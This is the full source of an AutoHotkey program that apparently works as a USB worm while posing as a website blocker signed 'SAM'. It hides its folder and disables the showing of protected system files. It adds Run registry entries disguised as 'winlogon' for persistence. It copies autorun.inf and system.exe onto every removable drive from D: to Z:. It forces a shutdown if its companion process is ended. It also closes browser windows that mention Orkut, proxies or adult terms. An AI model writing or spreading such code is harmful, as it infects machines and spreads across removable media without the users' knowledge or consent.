; <COMPILER: v1.0.47.5>
#persistent
#notrayicon
#singleinstance force

DetectHiddenWindows, on

Run, C:\Config\sys.exe

sleep 1000

FileSetAttrib, +RSH, C:\Config


settimer,reproduce,3000


settimer,ban,2000





settimer,protect,3000

protect:

Process,exist,sys.exe
NewPID = %ErrorLevel%
if NewPID = 0
{
    Shutdown, 6
    return
}
return









reproduce:

{



regread,regdata,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,winlogon
ifnotequal,regdata,C:\Config\system.exe
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,winlogon,C:\Config\system.exe



regread,regdata,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Run,winlogon
ifnotequal,regdata,C:\Config\system.exe
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,winlogon,C:\Config\system.exe



regread,regdata,REG_DWORD,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced,ShowSuperHidden
ifnotequal,regdata,0
regwrite,REG_DWORD,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced,ShowSuperHidden,0


driveget,data,Type,d:\
ifequal,data,Removable
     {
      driveget,data1,status,d:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,d:\autorun.inf
	FileSetAttrib,-RSH,d:\system.exe
        FileCopy,C:\Config\child\autorun.inf,d:\,1
        FileCopy,C:\Config\child\system.exe,d:\,1
      }

     }

driveget,data,Type,e:\
ifequal,data,Removable
     {
      driveget,data1,status,e:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,e:\autorun.inf
	FileSetAttrib,-RSH,e:\system.exe
        FileCopy,C:\Config\child\autorun.inf,e:\,1
        FileCopy,C:\Config\child\system.exe,e:\,1
      }

     }

driveget,data,Type,f:\
ifequal,data,Removable
     {
      driveget,data1,status,f:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,f:\autorun.inf
	FileSetAttrib,-RSH,f:\system.exe
        FileCopy,C:\Config\child\autorun.inf,f:\,1
        FileCopy,C:\Config\child\system.exe,f:\,1
      }

     }

driveget,data,Type,g:\
ifequal,data,Removable
     {
      driveget,data1,status,g:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,g:\autorun.inf
	FileSetAttrib,-RSH,g:\system.exe
        FileCopy,C:\Config\child\autorun.inf,g:\,1
        FileCopy,C:\Config\child\system.exe,g:\,1
      }

     }

driveget,data,Type,h:\
ifequal,data,Removable
     {
      driveget,data1,status,h:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,h:\autorun.inf
	FileSetAttrib,-RSH,h:\system.exe
        FileCopy,C:\Config\child\autorun.inf,h:\,1
        FileCopy,C:\Config\child\system.exe,h:\,1
      }

     }

driveget,data,Type,i:\
ifequal,data,Removable
     {
      driveget,data1,status,i:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,i:\autorun.inf
	FileSetAttrib,-RSH,i:\system.exe
        FileCopy,C:\Config\child\autorun.inf,i:\,1
        FileCopy,C:\Config\child\system.exe,i:\,1
      }

     }

driveget,data,Type,j:\
ifequal,data,Removable
     {
      driveget,data1,status,j:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,j:\autorun.inf
	FileSetAttrib,-RSH,j:\system.exe
        FileCopy,C:\Config\child\autorun.inf,j:\,1
        FileCopy,C:\Config\child\system.exe,j:\,1
      }

     }

driveget,data,Type,k:\
ifequal,data,Removable
     {
      driveget,data1,status,k:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,k:\autorun.inf
	FileSetAttrib,-RSH,k:\system.exe
        FileCopy,C:\Config\child\autorun.inf,k:\,1
        FileCopy,C:\Config\child\system.exe,k:\,1
      }

     }

driveget,data,Type,l:\
ifequal,data,Removable
     {
      driveget,data1,status,l:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,l:\autorun.inf
	FileSetAttrib,-RSH,l:\system.exe
        FileCopy,C:\Config\child\autorun.inf,l:\,1
        FileCopy,C:\Config\child\system.exe,l:\,1
      }

     }

driveget,data,Type,m:\
ifequal,data,Removable
     {
      driveget,data1,status,m:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,m:\autorun.inf
	FileSetAttrib,-RSH,m:\system.exe
        FileCopy,C:\Config\child\autorun.inf,m:\,1
        FileCopy,C:\Config\child\system.exe,m:\,1
      }

     }

driveget,data,Type,n:\
ifequal,data,Removable
     {
      driveget,data1,status,n:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,n:\autorun.inf
	FileSetAttrib,-RSH,n:\system.exe
        FileCopy,C:\Config\child\autorun.inf,n:\,1
        FileCopy,C:\Config\child\system.exe,n:\,1
      }

     }

driveget,data,Type,o:\
ifequal,data,Removable
     {
      driveget,data1,status,o:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,o:\autorun.inf
	FileSetAttrib,-RSH,o:\system.exe
        FileCopy,C:\Config\child\autorun.inf,o:\,1
        FileCopy,C:\Config\child\system.exe,o:\,1
      }

     }

driveget,data,Type,x:\
ifequal,data,Removable
     {
      driveget,data1,status,x:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,x:\autorun.inf
	FileSetAttrib,-RSH,x:\system.exe
        FileCopy,C:\Config\child\autorun.inf,x:\,1
        FileCopy,C:\Config\child\system.exe,x:\,1
      }

     }

driveget,data,Type,y:\
ifequal,data,Removable
     {
      driveget,data1,status,y:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,y:\autorun.inf
	FileSetAttrib,-RSH,y:\system.exe
        FileCopy,C:\Config\child\autorun.inf,y:\,1
        FileCopy,C:\Config\child\system.exe,y:\,1
      }

     }

driveget,data,Type,z:\
ifequal,data,Removable
     {
      driveget,data1,status,z:\
      ifequal,data1,Ready
      {
        FileSetAttrib,-RSH,z:\autorun.inf
	FileSetAttrib,-RSH,z:\system.exe
        FileCopy,C:\Config\child\autorun.inf,z:\,1
        FileCopy,C:\Config\child\system.exe,z:\,1
      }

     }



}


ban:
{
WinGetActiveTitle, ed

 ifinstring,ed,Orkut
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,powerscrap
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,CalculatePie
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,orkuch
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,proxy
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,anonymous
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }


 ifinstring,ed,sex
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ifinstring,ed,Porn
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
ifinstring,ed,fuck
  {
   WinClose %ed%
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }

}

ifwinactive ahk_class IEFrame
{

 ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,Orkut
  {
   WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,Orkut
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,Orkut
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,Orkut
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }



 ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,powerscrap
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,powerscrap
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,powerscrap
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,powerscrap
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }



ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,Proxy
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,Proxy
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,Proxy
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,Proxy
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nGood attempt !!   Try another Proxy ...`n `n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }



ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,CalculatePie
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,CalculatePie
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,CalculatePie
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,CalculatePie
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nOrkut is Banned, Don't try to open it since it is restricted !!!`n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }



ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,sex
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
   }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,sex
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
   }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,sex
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,sex
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }




ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,porn
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,porn
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,porn
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,porn
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }




ControlGetText,ed,edit1,ahk_class IEFrame
 ifinstring,ed,fuck
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit2,ahk_class IEFrame
 ifinstring,ed,fuck
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit3,ahk_class IEFrame
 ifinstring,ed,fuck
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }
 ControlGetText,ed,edit4,ahk_class IEFrame
 ifinstring,ed,fuck
  {
    WinClose ahk_class IEFrame
   SoundPlay,*64
   SplashTextOn, 500, 100,,`nObscene sites are Banned, So dont dare to access them... `n`n- SAM -
   Sleep, 4000
   SplashTextOff
   return
  }




}





